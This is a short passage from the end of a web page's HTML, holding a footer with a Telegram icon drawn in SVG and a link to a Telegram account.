              <path d="M22.908 2.292c-.277-.228-.682-.256-1.125-.08L1.94 9.184c-1.036.412-1.04 1.056-.072 1.368l4.663 1.52 1.778 5.89c.193.637.307.88.7.91.393.03.612-.14.885-.383l2.127-2.002 4.42 3.27c.812.597 1.395.29 1.585-.735l2.91-16.05c.09-.5-.01-.83-.428-1.09zM8.47 13.477l-.292 3.22-.917-3.058L19.86 6.33 8.47 13.477z"/>
            </svg>
            <a href="https://t.me/nezpoder" target="_blank" class="text-blue-600 hover:underline dark:text-blue-400">Telegram</a>
        </span>
    </p>
</footer>
</body>
</html>